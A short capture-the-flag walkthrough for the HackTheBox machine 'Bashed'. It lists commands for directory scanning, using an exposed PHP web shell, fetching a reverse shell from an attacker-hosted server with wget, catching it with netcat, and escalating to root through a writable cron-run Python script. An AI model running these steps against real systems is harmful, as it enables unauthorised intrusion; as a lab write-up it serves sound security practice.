[*] Walkthrough For Bashed From HackTheBox

[*] Scanning And Enumeration

[+] Open Ports

80/tcp

[*] The Website Is About PhP-Bash
[*] There Is A Directory Named Uploads But It Is Empty
[*] Lets Use Gobuster

gobuster dir -u <IP> -w <Path To Wordlist>

[*] Found A Webshell

<IP>/dev/phpbash.php

[*] We Have A Shell As www-data

sudo -l

[*] We Can Escalate To Another But, We Can't As It Is A Web Shell!
[*] But As We Are www-data, We Can Add A Php Reverse Shell In The Uploads Folder And Get A NC Shell Back! 
[*] Lets Run A Python Http Server

python -m SimpleHTTPServer

[*] Lets wget It Using The WebShell

wget <MYIP>/Reverse.php

[*] Lets Start A Netcat Shell
[*] Go To <IP>/uploads/Reverse.php
[*] Got A Shell As www-data
[*] But A Dumb Shell!
[*] Lets Make It Interactive By Using Python

python -c 'import pty;pty.spawn("/bin/bash")'

[*] Got It
[*] Sudo Su Doesnt Work
[*] So Lets Run:

sudo -u scriptmanager /bin/bash

[*] Got A Shell As Scriptmanager
[*] There Is A Scripts Folder(Not Default In Linux)
[*] Found A CronJob
[*] Add A Python RevShell In The test.py
[*] Start NC Listener
[*] Got A Root Shell

[*] Done!